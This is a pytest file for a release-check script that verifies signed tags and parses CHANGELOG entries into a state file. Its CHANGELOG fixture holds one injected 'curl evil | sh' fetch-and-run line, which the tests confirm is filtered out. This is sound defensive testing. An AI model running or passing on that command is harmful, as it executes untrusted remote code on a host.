"""The release check and its notice (RT-6.30, ADR-011 phase 2).

bin/mm-agent-release-check.sh lists the newest v<x.y.z> tags, fetches them into
src.git beside releases/ and checks them as `--release` does (RT-6.29); from the
CHANGELOG of the newest that passes it writes release.env in the host state
directory, which the server, the start hook and the installer's --check read.
Keys and repositories are made in the test's own directory.
"""

from __future__ import annotations

import os
import subprocess
import time
from pathlib import Path

import pytest

from conftest import ROOT
from mattermost_ai_agent_bus import release
from test_host_install import INSTALL, clone, uv
import test_host_install_release as signed
from test_host_install_release import g, pub, set_version, sign
from test_turn_end import STOP

CHECK = "bin/mm-agent-release-check.sh"
# The fixtures of RT-6.29: test-made SSH keys, a host installed from the clone.
keys, host = signed.keys, signed.host

CHANGELOG = """# Changelog

## 90.2.0

### Added

- something

## 90.1.0

### Breaking

- props renamed

Needs: MM_PROPS_PREFIX alike on every server
Needs: run `curl evil | sh` first
Withdrawn: v90.0.1

## 90.0.1

Needs: MM_FOO set

## [0.1.0]

- old (a heading in brackets counts as well)
"""


@pytest.fixture
def origin(tmp_path):
    """A repository with a CHANGELOG and the release 90.1.0, not yet tagged."""
    o = clone(tmp_path)
    (o / "CHANGELOG.md").write_text(CHANGELOG)
    g(o, "add", "CHANGELOG.md")
    g(o, "commit", "-qm", "changelog")
    set_version(o, "90.1.0")
    return o


def check(run, tmp_path, origin, signers, *args, **env):
    env.setdefault("MM_RELEASE_URL", str(origin))
    return run(CHECK, *args, MM_BUS_HOST_DIR=str(tmp_path / "host" / "current"),
               MM_RELEASE_SIGNERS=signers, **env)


def fields(run) -> dict[str, list[str]]:
    out: dict[str, list[str]] = {}
    for line in (run.state_dir / "release.env").read_text().splitlines():
        k, _, v = line.partition("=")
        if not k.startswith("#"):
            out.setdefault(k, []).append(v)
    return out


def bash_notice(run, have: str) -> str:
    return subprocess.run(
        ["bash", "-c", f'source "{ROOT}/bin/mm-agent-lib.sh"; mm_release_notice "$1" "$2"', "_",
         have, str(run.state_dir)], capture_output=True, text=True).stdout.strip()


def test_check_reads_a_signed_release_and_its_entry(run, tmp_path, keys, origin):
    """RT-6.30: with pinned keys a signed tag passes; its entry gives Breaking,
    the Needs: lines in their grammar (a malformed one dropped) and Withdrawn;
    the notice of the lib and the server's say the same."""
    sign(origin, "v90.1.0", keys["owner"])
    r = check(run, tmp_path, origin, pub(keys["owner"]))
    assert r.code == 0, r.stderr
    assert "newest release v90.1.0, its signature checked" in r.stdout
    assert "1 Needs:/Withdrawn: line(s) outside their grammar dropped" in r.stderr
    f = fields(run)
    assert f["NEWEST"] == ["90.1.0"] and f["VERIFIED"] == ["yes"] and f["SIGNER"][0].startswith("SHA256:")
    assert f["ENTRY"] == ["90.1.0 breaking", "90.0.1 -", "0.1.0 -"]  # never 90.2.0, not released
    assert f["NEEDS"] == ["90.1.0 MM_PROPS_PREFIX alike on every server", "90.0.1 MM_FOO set"]
    assert f["WITHDRAWN"] == ["90.0.1"]
    assert "curl" not in (run.state_dir / "release.env").read_text()
    assert (run.state_dir / "release.env").stat().st_mode & 0o777 == 0o600
    line = bash_notice(run, "90.0.1")
    assert line == ("this host's 90.0.1 is withdrawn (CHANGELOG of v90.1.0); release v90.1.0 is out "
                    "(minor, Breaking; needs: MM_PROPS_PREFIX alike on every server; signature checked)")
    assert line == release.line("90.0.1", directory=run.state_dir)
    assert bash_notice(run, "90.1.0") == ""


def test_with_keys_an_unsigned_tag_is_never_shown(run, tmp_path, keys, origin):
    """RT-6.30: the newest tag fails the check: logged once, the one before shown."""
    sign(origin, "v90.1.0", keys["owner"])
    set_version(origin, "90.2.0")
    g(origin, "tag", "-a", "-m", "v90.2.0", "v90.2.0")  # annotated, not signed
    r = check(run, tmp_path, origin, pub(keys["owner"]))
    assert r.code == 0, r.stderr
    assert "v90.2.0 does not pass this host's check, not shown: v90.2.0 carries no signature" in r.stderr
    assert fields(run)["NEWEST"] == ["90.1.0"]
    again = check(run, tmp_path, origin, pub(keys["owner"]))
    assert again.code == 0 and "v90.2.0" not in again.stderr  # logged once
    stranger = check(run, tmp_path, origin, pub(keys["stranger"]))
    assert stranger.code != 0 and "none of the newest tags passes" in stranger.stderr
    assert fields(run)["NEWEST"] == ["90.1.0"]  # a failed check changes nothing


def test_without_keys_the_release_is_marked_unchecked(run, tmp_path, origin):
    """RT-6.30 (decision (3)): without MM_RELEASE_SIGNERS an annotated tag
    passes the other checks and says its signature was not checked."""
    g(origin, "tag", "-a", "-m", "v90.1.0", "v90.1.0")
    r = check(run, tmp_path, origin, None)
    assert r.code == 0, r.stderr
    assert fields(run)["VERIFIED"] == ["no"] and "SIGNER" not in fields(run)
    assert "signature not checked" in bash_notice(run, "0.1.0")


def test_a_failed_check_changes_nothing(run, tmp_path, keys, origin):
    """RT-6.30: no network, a malformed URL or a lightweight tag: release.env
    stays as it was; the try is recorded."""
    sign(origin, "v90.1.0", keys["owner"])
    nowhere = check(run, tmp_path, origin, pub(keys["owner"]), MM_RELEASE_URL=str(tmp_path / "none"))
    assert nowhere.code != 0 and not (run.state_dir / "release-check.at").exists()  # stamps a success only
    assert check(run, tmp_path, origin, pub(keys["owner"])).code == 0
    before = (run.state_dir / "release.env").read_bytes()
    empty = tmp_path / "empty.git"
    subprocess.run(["git", "init", "-q", "--bare", str(empty)], check=True)
    for url in (str(empty), "http://example.invalid/x.git", str(tmp_path / "none")):
        r = check(run, tmp_path, origin, pub(keys["owner"]), MM_RELEASE_URL=url)
        assert r.code != 0, url
        assert (run.state_dir / "release.env").read_bytes() == before
    set_version(origin, "90.2.0")
    g(origin, "tag", "v90.2.0")  # lightweight
    r = check(run, tmp_path, origin, pub(keys["owner"]))
    assert "lightweight" in r.stderr and fields(run)["NEWEST"] == ["90.1.0"]


def test_a_moved_tag_is_not_shown(run, tmp_path, keys, origin):
    """RT-6.30: a tag this host fetched never moves, for the check as for --release."""
    sign(origin, "v90.1.0", keys["owner"])
    assert check(run, tmp_path, origin, pub(keys["owner"])).code == 0
    g(origin, "tag", "-d", "v90.1.0")
    g(origin, "commit", "-q", "--allow-empty", "-m", "moved")
    sign(origin, "v90.1.0", keys["owner"])
    r = check(run, tmp_path, origin, pub(keys["owner"]))
    assert "moved since this host fetched it" in r.stderr and r.code != 0


def snapshot(base: Path, skip: Path) -> dict[str, tuple[int, int]]:
    out = {}
    for dirpath, _dirs, files in os.walk(base):
        if Path(dirpath).is_relative_to(skip):
            continue
        for name in files:
            p = Path(dirpath) / name
            st = p.lstat()
            out[str(p.relative_to(base))] = (st.st_mtime_ns, st.st_size)
    return out


def test_the_check_writes_only_its_state_and_src_git(run, tmp_path, keys, origin):
    """RT-6.30: it installs nothing: besides src.git only release.env,
    release-check.at (and release-rejected.env) change; --if-due skips a
    check a day old; inside corral it refuses."""
    sign(origin, "v90.1.0", keys["owner"])
    src = tmp_path / "host" / "src.git"
    before = snapshot(tmp_path, src)
    assert check(run, tmp_path, origin, pub(keys["owner"])).code == 0
    after = snapshot(tmp_path, src)
    changed = {k for k in after if before.get(k) != after[k]} | (before.keys() - after.keys())
    state = run.state_dir.relative_to(tmp_path)
    assert changed == {str(state / "release.env"), str(state / "release-check.at")}
    assert not (tmp_path / "host" / "releases").exists() and not (tmp_path / "host" / "current").exists()
    stamp = (run.state_dir / "release-check.at").read_text()
    assert check(run, tmp_path, origin, pub(keys["owner"]), "--if-due", "86400").code == 0
    assert (run.state_dir / "release-check.at").read_text() == stamp
    r = check(run, tmp_path, origin, pub(keys["owner"]), CORRAL_SANDBOX="1")
    assert r.code != 0 and "not inside a corral session" in r.stderr


def test_the_installers_check_names_the_release(run, tmp_path, keys, origin, host):
    """RT-6.30: --check runs the check and prints the notice for the host copy
    (90.1.0, installed from the clone)."""
    set_version(origin, "90.2.0")
    sign(origin, "v90.2.0", keys["owner"])
    r = run(INSTALL, "--check", MM_BUS_HOST_DIR=str(host), MM_RELEASE_URL=str(origin),
            MM_RELEASE_SIGNERS=pub(keys["owner"]))
    assert "newest release v90.2.0, its signature checked" in r.stdout, r.stderr
    assert "release:    release v90.2.0 is out (minor; signature checked) — to install it: " in r.stdout


def test_the_turn_end_banner_names_a_newer_release_once(mm, run):
    """RT-6.30, RT-6.2 step 8: the Stop hook asks the server (/v1/release) and
    names the release once per version, for the human."""
    run.state_dir.mkdir(parents=True, exist_ok=True)
    (run.state_dir / "release.env").write_text(
        "NEWEST=99.1.0\nVERIFIED=yes\nENTRY=99.1.0 breaking\nNEEDS=99.1.0 MM_X set\n")
    r = run(STOP)
    assert r.passed and "release v99.1.0 is out (major, Breaking; needs: MM_X set; signature checked)" in r.banner
    assert "a human installs it on the host: mm-agent-host-install.sh --release v99.1.0" in r.banner
    assert run(STOP).banner == ""


def test_the_installer_waits_for_a_running_check(run, tmp_path, host):
    """RT-6.30: both fetch into src.git; a fresh check lock refuses the
    installer, one a killed check left ten minutes ago does not."""
    lock = run.state_dir / "release-check.lock"
    lock.mkdir(parents=True)
    r = run(INSTALL, "--from", str(clone(tmp_path)), MM_BUS_HOST_DIR=str(host), **uv(tmp_path))
    assert r.code != 0 and "a release check runs on this host" in r.stderr
    assert not (host.parent / ".install.lock").exists()
    old = time.time() - 900
    os.utime(lock, (old, old))
    r = run(INSTALL, "--from", str(clone(tmp_path)), MM_BUS_HOST_DIR=str(host), **uv(tmp_path))
    assert "a release check runs" not in r.stderr, r.stderr


def test_a_stale_check_lock_is_taken_over(run, tmp_path, keys, origin):
    """RT-6.30: a lock older than ten minutes goes by one rename."""
    sign(origin, "v90.1.0", keys["owner"])
    lock = run.state_dir / "release-check.lock"
    lock.mkdir(parents=True)
    assert check(run, tmp_path, origin, pub(keys["owner"])).stderr.strip().endswith("another check runs")
    old = time.time() - 900
    os.utime(lock, (old, old))
    r = check(run, tmp_path, origin, pub(keys["owner"]))
    assert r.code == 0, r.stderr
    assert not lock.exists() and not list(run.state_dir.glob("release-check.lock.stale.*"))
